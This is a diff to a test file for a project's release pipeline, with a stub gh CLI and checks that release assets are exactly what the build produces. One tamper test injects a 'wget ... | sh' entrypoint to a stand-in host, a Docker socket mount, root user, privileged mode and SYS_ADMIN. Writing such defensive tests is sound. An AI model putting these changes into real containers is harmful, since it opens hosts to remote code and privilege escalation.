@@ -62,6 +62,80 @@ function secretsRead(job: Job): string[] {
   return [...new Set([...text.matchAll(/secrets\.([A-Z0-9_]+)/g)].map((m) => m[1]!))].filter((s) => s !== 'GITHUB_TOKEN').sort();
 }
 
+interface FakeRun {
+  id: number;
+  head_sha: string;
+  head_branch: string;
+  event: string;
+  status: string;
+  conclusion: string | null;
+  /** The run's jobs, by name, and how they ended. */
+  jobs: Record<string, string>;
+}
+
+/**
+ * A stand-in for gh that answers from these runs, as GitHub would: `gh run list --branch` (by head_branch), the
+ * workflow runs API (by head_sha) and a run's jobs. `--jq` is applied with jq, raw. Also a `sleep` that does nothing.
+ */
+function fakeGh(runs: Record<string, FakeRun[]>): string {
+  const dir = mkdtempSync(join(tmpdir(), 'trikey-gh-'));
+  const bin = join(dir, 'bin');
+  mkdirSync(bin);
+  const api = Object.fromEntries(
+    Object.entries(runs).map(([wf, list]) => [
+      wf,
+      list.map((r) => ({ ...r, html_url: `https://github.com/o/r/actions/runs/${r.id}`, url: `https://github.com/o/r/actions/runs/${r.id}`, databaseId: r.id })),
+    ])
+  );
+  writeFileSync(join(dir, 'runs.json'), JSON.stringify(api));
+  writeFileSync(
+    join(bin, 'gh'),
+    [
+      '#!/usr/bin/env bash',
+      'set -euo pipefail',
+      `RUNS='${join(dir, 'runs.json')}'`,
+      'jqexpr=""; wf=""; branch=""; args=("$@")',
+      'for ((i=0;i<${#args[@]};i++)); do case "${args[$i]}" in --jq) jqexpr="${args[$((i+1))]}";; --workflow) wf="${args[$((i+1))]}";; --branch) branch="${args[$((i+1))]}";; esac; done',
+      'out() { if [ -n "$jqexpr" ]; then jq -r "$jqexpr" <<<"$1"; else echo "$1"; fi; }',
+      'if [ "$1" = run ] && [ "$2" = list ]; then',
+      '  out "$(jq --arg wf "$wf" --arg b "$branch" \'[.[$wf][] | select(.head_branch == $b)] | sort_by(-.id)\' "$RUNS")"; exit 0',
+      'fi',
+      'if [ "$1" = api ]; then',
+      '  path="$2"',
+      '  if [[ "$path" =~ /actions/workflows/([^/]+)/runs\\?head_sha=([0-9a-f]+) ]]; then',
+      '    out "$(jq --arg wf "${BASH_REMATCH[1]}" --arg sha "${BASH_REMATCH[2]}" \'{workflow_runs: [.[$wf][] | select(.head_sha == $sha)]}\' "$RUNS")"; exit 0',
+      '  fi',
+      '  if [[ "$path" =~ /actions/runs/([0-9]+)/jobs ]]; then',
+      '    out "$(jq --argjson id "${BASH_REMATCH[1]}" \'{jobs: [.[][] | select(.id == $id) | .jobs | to_entries[] | {name: .key, conclusion: .value, status: "completed"}]}\' "$RUNS")"; exit 0',
+      '  fi',
+      'fi',
+      'echo "fake gh: unexpected call: $*" >&2; exit 2',
+    ].join('\n'),
+    { mode: 0o755 }
+  );
+  writeFileSync(join(bin, 'sleep'), '#!/usr/bin/env bash\nexit 0\n', { mode: 0o755 });
+  return bin;
+}
+
+const TAG_SHA = 'a'.repeat(40);
+const BRANCH_SHA = 'b'.repeat(40);
+/** A release tag's runs, and newer ones on a branch named like the tag (sweep 3 #8). */
+const RELEASE_RUNS: Record<string, FakeRun[]> = {
+  'docker.yml': [
+    { id: 200, head_sha: TAG_SHA, head_branch: 'v0.1.99-alpha', event: 'workflow_dispatch', status: 'completed', conclusion: 'success', jobs: { publish: 'success', verified: 'success' } },
+    // A branch called like the tag, its own commit.
+    { id: 300, head_sha: BRANCH_SHA, head_branch: 'v0.1.99-alpha', event: 'workflow_dispatch', status: 'completed', conclusion: 'success', jobs: { build: 'success', verified: 'success' } },
+    // The same commit dispatched on such a branch: `verified` cannot run there.
+    { id: 310, head_sha: TAG_SHA, head_branch: 'v0.1.99-alpha', event: 'workflow_dispatch', status: 'completed', conclusion: 'success', jobs: { build: 'success', verified: 'skipped' } },
+    // A pull request at the same commit.
+    { id: 320, head_sha: TAG_SHA, head_branch: 'v0.1.99-alpha', event: 'pull_request', status: 'completed', conclusion: 'success', jobs: { build: 'success' } },
+  ],
+  'android-apk.yml': [
+    { id: 210, head_sha: TAG_SHA, head_branch: 'v0.1.99-alpha', event: 'workflow_dispatch', status: 'completed', conclusion: 'success', jobs: { release: 'success' } },
+    { id: 330, head_sha: BRANCH_SHA, head_branch: 'v0.1.99-alpha', event: 'push', status: 'completed', conclusion: 'success', jobs: { apk: 'success' } },
+  ],
+};
+
 describe('docker.yml', () => {
   const wf = workflow('docker.yml');
 
@@ -173,8 +247,14 @@ describe('the guardian image tags', () => {
     const job = wf.jobs['compose-files']!;
     expect(job.env!['DIGEST']).toBe('${{ needs.verified.outputs.digest }}');
     const pin = job.steps!.find((s) => s.name === 'Pin the image in the compose file')!;
-    expect(pin.run).toContain('pinned="${IMAGE}:${VERSION}@${DIGEST}"');
-    expect(pin.run).toContain('grep -Fxq "    image: ${pinned}"');
+    // The script publish-release.yml runs again, to require the draft's files to be exactly these.
+    expect(pin.run).toContain('OUT="${RUNNER_TEMP}/assets" bash packaging/compose/release-compose.sh');
+    const script = read('packaging/compose/release-compose.sh');
+    expect(script).toContain('pinned="${IMAGE}:${VERSION}@${DIGEST}"');
+    expect(script).toContain('grep -Fxq "    image: ${pinned}"');
+    expect(read('packaging/check-release-assets.sh')).toContain('COMPOSE_SCRIPT="${COMPOSE_SCRIPT:-packaging/compose/release-compose.sh}"');
+    const sparse = String(workflow('publish-release.yml').jobs['publish']!.steps!.find((s) => s.uses?.startsWith('actions/checkout@'))!.with!['sparse-checkout']);
+    for (const f of ['packaging/compose/release-compose.sh', 'packaging/compose/docker-compose.yml', 'packaging/compose/.env.example']) expect(sparse).toContain(f);
   });
 
   it("makes the release's compose file from the repository's, as the step really runs (0.1.22's release stopped here)", () => {
@@ -276,10 +356,48 @@ describe('release files: attached to a draft, published only after the checks', 
     const wait = pub.jobs['wait']!;
     expect(wait.if).toBe(RELEASE_TAG);
     expect(wait.permissions).toEqual({ actions: 'read', contents: 'read' });
-    const run = wait.steps![0]!.run!;
+    const run = wait.steps!.find((s) => s.name === 'Wait for the release builds')!.run!;
     expect(run).toContain('for wf in docker.yml android-apk.yml; do');
-    expect(run).toContain('--branch "${TAG}"');
+    expect(run).not.toContain('--branch');
     expect(run).toMatch(/if \[ "\$\{conclusion\}" != success \]; then[\s\S]*?exit 1/);
+  });
+
+  it("takes the tag's own runs, by commit and by the jobs only a tag runs, not a branch named like the tag (sweep 3 #8)", () => {
+    const step = pub.jobs['wait']!.steps!.find((s) => s.name === 'Wait for the release builds')!;
+    const temp = mkdtempSync(join(tmpdir(), 'trikey-wait-'));
+    const output = join(temp, 'output');
+    writeFileSync(output, '');
+    const out = execFileSync('bash', ['-c', step.run!], {
+      cwd: ROOT,
+      env: { PATH: `${fakeGh(RELEASE_RUNS)}:${process.env['PATH']}`, GITHUB_OUTPUT: output, GITHUB_REPOSITORY: 'o/r', GITHUB_SHA: TAG_SHA, TAG: 'v0.1.99-alpha' },
+      encoding: 'utf8',
+      stdio: 'pipe',
+    });
+    expect(out).toContain('succeeded for v0.1.99-alpha');
+    // Run 200, whose digest artifact `publish` then downloads; not 300 (another commit) nor 310 (no `verified`).
+    expect(readFileSync(output, 'utf8')).toBe('docker-run=200\n');
+    // The checkout the step needs.
+    const checkout = pub.jobs['wait']!.steps!.find((s) => s.uses?.startsWith('actions/checkout@'))!;
+    expect(checkout.with!['sparse-checkout']).toBe('.github/scripts/release-run.sh');
+  });
+
+  it("fails when the tag's newest run failed, even if an older one succeeded", () => {
+    const step = pub.jobs['wait']!.steps!.find((s) => s.name === 'Wait for the release builds')!;
+    const runs = structuredClone(RELEASE_RUNS);
+    runs['docker.yml']!.push({ id: 400, head_sha: TAG_SHA, head_branch: 'v0.1.99-alpha', event: 'workflow_dispatch', status: 'completed', conclusion: 'failure', jobs: { verified: 'failure' } });
+    const temp = mkdtempSync(join(tmpdir(), 'trikey-wait-'));
+    let failed = '';
+    try {
+      execFileSync('bash', ['-c', step.run!], {
+        cwd: ROOT,
+        env: { PATH: `${fakeGh(runs)}:${process.env['PATH']}`, GITHUB_OUTPUT: join(temp, 'output'), GITHUB_REPOSITORY: 'o/r', GITHUB_SHA: TAG_SHA, TAG: 'v0.1.99-alpha' },
+        encoding: 'utf8',
+        stdio: 'pipe',
+      });
+    } catch (e) {
+      failed = String((e as { stdout?: string }).stdout);
+    }
+    expect(failed).toContain('docker.yml for v0.1.99-alpha ended failure');
   });
 
   it('publishes in the release environment, after checking every file, and compares the files after', () => {
@@ -322,6 +440,18 @@ describe('packaging/check-release-assets.sh', () => {
   const DIGEST = `sha256:${'d'.repeat(64)}`;
   const CERT = read('packaging/android/release-cert.sha256').split('\n').filter((l) => !l.startsWith('#')).join('').trim();
   const sha = (b: string | Buffer) => createHash('sha256').update(b).digest('hex');
+  const makeComposeFiles = (out: string) =>
+    execFileSync('bash', [join(ROOT, 'packaging/compose/release-compose.sh')], {
+      env: { PATH: process.env['PATH'] ?? '', IMAGE, VERSION: TAG.slice(1), DIGEST, TAG, OUT: out },
+      stdio: 'pipe',
+    });
+  /** Replaces a compose file on the draft, with its .sha256 line and GitHub's digest to match (a token with contents: write could). */
+  const replace = (assets: string, list: { name: string; digest: string | null }[], name: string, body: string) => {
+    writeFileSync(join(assets, name), body);
+    const sums = ['trikey-guardian-compose.yml', 'trikey-guardian.env.example'].map((n) => `${sha(readFileSync(join(assets, n)))}  ${n}\n`).join('');
+    writeFileSync(join(assets, 'trikey-guardian-compose.sha256'), sums);
+    for (const a of list) a.digest = `sha256:${sha(readFileSync(join(assets, a.name)))}`;
+  };
 
   /** A draft's files as the builds make them, with stand-ins for apksigner and aapt2 that read a marker in the APK. */
   function draft(change: (dir: string, assets: { name: string; digest: string | null }[]) => void = () => {}) {
@@ -335,15 +465,11 @@ describe('packaging/check-release-assets.sh', () => {
     const files: Record<string, string> = {
       [`trikey-alpha-${TAG}.apk`]: `app.trikey.wallet\n${CERT}\n`,
       [`trikey-alpha-foss-${TAG}.apk`]: `app.trikey.wallet.foss\n${CERT}\n`,
-      'trikey-guardian-compose.yml': `services:\n  guardian:\n    image: ${IMAGE}:0.1.22-alpha@${DIGEST}\n  bitcoind:\n    image: bitcoin/bitcoin:32.1@sha256:${'b'.repeat(64)}\n`,
-      'trikey-guardian.env.example': 'BITCOIN_NETWORK=signet\n',
     };
     for (const [name, body] of Object.entries(files)) writeFileSync(join(assets, name), body);
     for (const apk of Object.keys(files).filter((n) => n.endsWith('.apk'))) writeFileSync(join(assets, `${apk}.sha256`), `${sha(files[apk]!)}  ${apk}\n`);
-    writeFileSync(
-      join(assets, 'trikey-guardian-compose.sha256'),
-      ['trikey-guardian-compose.yml', 'trikey-guardian.env.example'].map((n) => `${sha(files[n]!)}  ${n}\n`).join('')
-    );
+    // The compose files as docker.yml's compose-files job makes them.
+    makeComposeFiles(assets);
     const listed = () => readdirSync(assets).map((name) => ({ name, digest: `sha256:${sha(readFileSync(join(assets, name)))}` }));
     const list = listed();
     change(assets, list);
@@ -411,6 +537,33 @@ describe('packaging/check-release-assets.sh', () => {
     expect(check(dir, { DIGEST: `sha256:${'0'.repeat(64)}` })).toMatchObject({ ok: false, out: expect.stringContaining('does not run') });
   });
 
+  it('refuses compose files that are not exactly what docker.yml makes, even with the right image line and checksums (sweep 3 #3)', () => {
+    const compose = 'trikey-guardian-compose.yml';
+    const made = (assets: string) => readFileSync(join(assets, compose), 'utf8');
+    const changes: Record<string, (yml: string) => string> = {
+      // The pinned image, but the host's Docker socket mounted into it, as root.
+      'docker.sock': (y) => y.replace('      - guardian-data:/data\n', '      - guardian-data:/data\n      - /var/run/docker.sock:/var/run/docker.sock\n'),
+      user: (y) => y.replace('    init: true\n', '    init: true\n    user: "0:0"\n'),
+      privileged: (y) => y.replace('    init: true\n', '    init: true\n    privileged: true\n'),
+      entrypoint: (y) => y.replace('    init: true\n', '    init: true\n    entrypoint: ["/bin/sh", "-c", "wget -qO- https://example.invalid/x | sh"]\n'),
+      'cap_add': (y) => y.replace('    cap_drop:\n      - ALL\n', '    cap_add:\n      - SYS_ADMIN\n'),
+      'another node image': (y) => y.replace(/image: bitcoin\/bitcoin:32\.1@sha256:[0-9a-f]{64}/, `image: bitcoin/bitcoin:32.1@sha256:${'e'.repeat(64)}`),
+    };
+    for (const [what, change] of Object.entries(changes)) {
+      const { dir } = draft((assets, list) => {
+        const before = made(assets);
+        const after = change(before);
+        expect(after, what).not.toBe(before);
+        replace(assets, list, compose, after);
+      });
+      const r = check(dir);
+      expect(r, what).toMatchObject({ ok: false, out: expect.stringContaining('is not the file docker.yml makes from packaging/compose') });
+    }
+    // The settings file too: another relay list, with the checksums made to match.
+    const { dir } = draft((assets, list) => replace(assets, list, 'trikey-guardian.env.example', 'BITCOIN_NETWORK=mainnet\nTRIKEY_RELAYS=wss://relay.example.invalid\n'));
+    expect(check(dir)).toMatchObject({ ok: false, out: expect.stringContaining('trikey-guardian.env.example is not the file docker.yml makes') });
+  });
+
   it('refuses a missing or an extra file, a file GitHub lists with another digest, and a stale checksum file', () => {
     const missing = draft((_assets, list) => list.splice(0, 1)).dir;
     expect(check(missing)).toMatchObject({ ok: false, out: expect.stringContaining('not the expected ones') });
@@ -430,26 +583,111 @@ describe('packaging/check-release-assets.sh', () => {
 });
 
 describe('start9.yml and umbrel-store.yml', () => {
-  it('run on a release tag only when called (or dispatched) with the digest, not on a tag push', () => {
-    for (const name of ['start9.yml', 'umbrel-store.yml']) {
+  const steps = {
+    'start9.yml': workflow('start9.yml').jobs['build']!.steps!,
+    'umbrel-store.yml': workflow('umbrel-store.yml').jobs['publish']!.steps!,
+  };
+  const digestStep = { 'start9.yml': 'The verified digest', 'umbrel-store.yml': 'Check the image digest' };
+
+  it('run on a release tag only when called with the digest, or dispatched with none: no digest can be typed in (sweep 3 #4)', () => {
+    for (const name of ['start9.yml', 'umbrel-store.yml'] as const) {
       const wf = workflow(name);
       expect(wf.on, name).not.toHaveProperty('push');
       expect(wf.on, name).toHaveProperty('workflow_call');
       expect((wf.on['workflow_call'] as { inputs: Record<string, { required: boolean }> }).inputs['image-digest']!.required).toBe(true);
+      // A run by hand takes no input at all.
+      expect(wf.on['workflow_dispatch'], name).toBeNull();
+      expect(wf.permissions?.['actions'], name).toBe('read');
+      // The digest comes from the artifact `verified` left: this run's when called, else the verified run's of this commit.
+      const s = steps[name];
+      const find = s.find((x) => x.name === "The docker.yml run that verified this commit's image")!;
+      expect(find.if, name).toContain("inputs.image-digest == ''");
+      expect(find.run, name).toMatch(/release-run\.sh"? verified docker\.yml verified\)/);
+      const downloads = s.filter((x) => x.uses?.startsWith('actions/download-artifact@'));
+      expect(downloads.map((d) => [d.if, d.with]), name).toEqual([
+        [expect.stringContaining("inputs.image-digest == ''"), expect.objectContaining({ name: 'guardian-image-digest', 'run-id': '${{ steps.run.outputs.id }}' })],
+        [expect.stringContaining("inputs.image-digest != ''"), { name: 'guardian-image-digest', path: '${{ runner.temp }}/digest' }],
+      ]);
+      const check = s.find((x) => x.name === digestStep[name])!;
+      expect(check.env, name).toEqual({ GIVEN: '${{ inputs.image-digest }}' });
+      expect(s.indexOf(check), name).toBeGreaterThan(s.indexOf(downloads[1]!));
+      // Only the checked digest goes further.
+      expect(JSON.stringify(s.filter((x) => x !== check)), name).not.toMatch(/\$\{\{ inputs\.image-digest \}\}/);
+    }
+    // docker.yml lets the called workflows read its artifacts.
+    const docker = workflow('docker.yml');
+    for (const name of ['start9', 'umbrel-store']) expect(docker.jobs[name]!.permissions?.['actions'], name).toBe('read');
+  });
+
+  it("finds the docker.yml run of the tag's commit in which `verified` succeeded, never another commit's", () => {
+    for (const name of ['start9.yml', 'umbrel-store.yml'] as const) {
+      const step = steps[name].find((x) => x.name === "The docker.yml run that verified this commit's image")!;
+      const run = (runs: Record<string, FakeRun[]>) => {
+        const temp = mkdtempSync(join(tmpdir(), 'trikey-digest-'));
+        const output = join(temp, 'output');
+        writeFileSync(output, '');
+        try {
+          execFileSync('bash', ['-c', step.run!], {
+            cwd: ROOT,
+            env: { PATH: `${fakeGh(runs)}:${process.env['PATH']}`, GITHUB_OUTPUT: output, GITHUB_REPOSITORY: 'o/r', GITHUB_SHA: TAG_SHA, GITHUB_WORKSPACE: ROOT },
+            encoding: 'utf8',
+            stdio: 'pipe',
+          });
+          return readFileSync(output, 'utf8');
+        } catch (e) {
+          return `failed: ${String((e as { stderr?: string }).stderr)}`;
+        }
+      };
+      expect(run(RELEASE_RUNS), name).toBe('id=200\n');
+      // Only a branch named like the tag (another commit, its own `verified`) and a run of the commit without `verified`.
+      const others = { 'docker.yml': RELEASE_RUNS['docker.yml']!.filter((r) => r.id !== 200) };
+      expect(run(others), name).toContain('No docker.yml run of');
     }
   });
 
-  it('pack and pin the given digest, and fail if the tag moved', () => {
-    const start9 = workflow('start9.yml').jobs['build']!.steps!.find((s) => s.name === 'Guardian image')!;
-    expect(start9.env!['DIGEST']).toBe('${{ inputs.image-digest }}');
+  it('refuses a given digest that is not the one `verified` left, and a tag that moved', () => {
+    const temp = mkdtempSync(join(tmpdir(), 'trikey-digest-'));
+    const verified = `sha256:${'c'.repeat(64)}`;
+    mkdirSync(join(temp, 'digest'));
+    writeFileSync(join(temp, 'digest', 'guardian-image-digest.txt'), `${verified}\n`);
+    const bin = join(temp, 'bin');
+    mkdirSync(bin);
+    // A stand-in for `docker buildx imagetools inspect`: the version tag names TAG_DIGEST.
+    writeFileSync(join(bin, 'docker'), '#!/usr/bin/env bash\necho "${TAG_DIGEST}"\n', { mode: 0o755 });
+    for (const name of ['start9.yml', 'umbrel-store.yml'] as const) {
+      const step = steps[name].find((x) => x.name === digestStep[name])!;
+      const run = (given: string, tagDigest = verified) => {
+        writeFileSync(join(temp, 'output'), '');
+        try {
+          execFileSync('bash', ['-c', step.run!], {
+            env: { PATH: `${bin}:${process.env['PATH']}`, RUNNER_TEMP: temp, GITHUB_OUTPUT: join(temp, 'output'), GIVEN: given, TAG_DIGEST: tagDigest, IMAGE: 'ghcr.io/theicaruswings/trikey-guardian', GITHUB_REF_NAME: 'v0.1.99-alpha' },
+            encoding: 'utf8',
+            stdio: 'pipe',
+          });
+          return readFileSync(join(temp, 'output'), 'utf8');
+        } catch (e) {
+          return `failed: ${String((e as { stdout?: string }).stdout)}`;
+        }
+      };
+      expect(run(''), name).toBe(`digest=${verified}\n`); // by hand
+      expect(run(verified), name).toBe(`digest=${verified}\n`); // called by docker.yml
+      expect(run(`sha256:${'e'.repeat(64)}`), name).toContain("is not the sha256:cccc");
+      if (name === 'umbrel-store.yml') expect(run(verified, `sha256:${'e'.repeat(64)}`)).toContain('the tag was changed');
+    }
+  });
+
+  it('pack and pin the checked digest, and fail if the tag moved', () => {
+    const start9 = steps['start9.yml'].find((s) => s.name === 'Guardian image')!;
+    expect(start9.env!['DIGEST']).toBe('${{ steps.digest.outputs.digest }}');
     expect(start9.run).toContain('docker pull --platform "${platform}" "${IMAGE}@${DIGEST}"');
     expect(start9.run).toContain('the tag was changed');
+    expect(steps['start9.yml'].find((s) => s.name === 'The packed image is the pushed digest')!.env!['DIGEST']).toBe('${{ steps.digest.outputs.digest }}');
     const umbrel = workflow('umbrel-store.yml').jobs['publish']!;
     expect(umbrel.if).toBe(RELEASE_TAG);
     expect(umbrel.environment).toBe('release');
     const check = umbrel.steps!.find((s) => s.name === 'Check the image digest')!;
-    expect(check.env!['DIGEST']).toBe('${{ inputs.image-digest }}');
     expect(check.run).toContain('the tag was changed');
+    expect(umbrel.steps!.find((s) => s.name === 'Copy the store')!.env!['DIGEST']).toBe('${{ steps.digest.outputs.digest }}');
     expect(JSON.stringify(umbrel.steps)).not.toMatch(/seq 1 60/);
   });
 });
@@ -606,6 +844,66 @@ describe('publish-release.yml: the last comparison before publishing', () => {
       stdio: 'pipe',
     });
     expect(out).toContain('Published');
+  });
+
+  /** Runs the Publish step against a stand-in gh whose files change once the release is published. */
+  function publishWithFilesChanged(immutable: boolean) {
+    const pub = workflow('publish-release.yml').jobs['publish']!.steps!.find((s) => s.name === 'Publish')!;
+    const temp = mkdtempSync(join(tmpdir(), 'trikey-publish-'));
+    const assets = [{ id: 1, name: 'a.yml', size: 10, digest: 'sha256:' + 'a'.repeat(64) }];
+    const swapped = [{ id: 9, name: 'a.yml', size: 11, digest: 'sha256:' + 'f'.repeat(64) }];
+    writeFileSync(join(temp, 'assets.json'), JSON.stringify(assets));
+    const bin = join(temp, 'bin');
+    mkdirSync(bin);
+    const log = join(temp, 'calls.log');
+    writeFileSync(
+      join(bin, 'gh'),
+      [
+        '#!/usr/bin/env bash',
+        `echo "$*" >> '${log}'`,
+        'args="$*"',
+        `state='${join(temp, 'published')}'`,
+        // Publishing works; going back to a draft is refused when the release is immutable.
+        'if [[ "$args" == *"draft=false"* ]]; then touch "$state"; echo \'{"html_url":"https://example.invalid/r","body":"The notes."}\'; exit 0; fi',
+        `if [[ "$args" == *"draft=true"* ]]; then ${immutable ? 'echo "HTTP 422: Cannot convert an immutable release to a draft" >&2; exit 1' : 'rm -f "$state"; echo "{}"; exit 0'}; fi`,
+        'if [[ "$args" == *"-X PATCH"* ]]; then echo "{}"; exit 0; fi',
+        'if [[ "$args" == *"/assets"* ]]; then',
+        `  if [ -e "$state" ]; then data='${JSON.stringify(swapped)}'; else data='${JSON.stringify(assets)}'; fi`,
+        '  for ((i=1;i<=$#;i++)); do if [ "${!i}" = --jq ]; then j=$((i+1)); jq -cS "${!j}" <<<"$data"; exit 0; fi; done',
+        '  echo "$data"; exit 0',
+        'fi',
+        'echo false',
+      ].join('\n'),
+      { mode: 0o755 }
+    );
+    try {
+      execFileSync('bash', ['-c', pub.run!], {
+        env: { PATH: `${bin}:${process.env['PATH']}`, RUNNER_TEMP: temp, ID: '7', TAG: 'v0.1.99-alpha', GITHUB_REPOSITORY: 'o/r' },
+        encoding: 'utf8',
+        stdio: 'pipe',
+      });
+      return { ok: true, out: '', calls: readFileSync(log, 'utf8') };
+    } catch (e) {
+      return { ok: false, out: String((e as { stdout?: string }).stdout), calls: readFileSync(log, 'utf8') };
+    }
+  }
+
+  it('puts a release whose files changed while publishing back to a draft (sweep 3 #7)', () => {
+    const r = publishWithFilesChanged(false);
+    expect(r.ok).toBe(false);
+    expect(r.calls).toContain('api -X PATCH repos/o/r/releases/7 -F draft=true');
+    expect(r.out).toContain('is a draft again');
+    expect(r.calls).not.toContain('withdrawn');
+  });
+
+  it('marks an immutable one withdrawn in its title and notes, since it cannot go back to a draft, and fails', () => {
+    const r = publishWithFilesChanged(true);
+    expect(r.ok).toBe(false);
+    expect(r.calls).toContain('-F draft=true');
+    expect(r.calls).toContain('name=Trikey v0.1.99-alpha: withdrawn, do not install');
+    expect(r.calls).toMatch(/body=\*\*Do not install this release\.\*\*[^\n]*\n\nThe notes\./);
+    expect(r.calls).toContain('make_latest=false');
+    expect(r.out).toContain('Release is public, marked withdrawn');
   });
 });
 
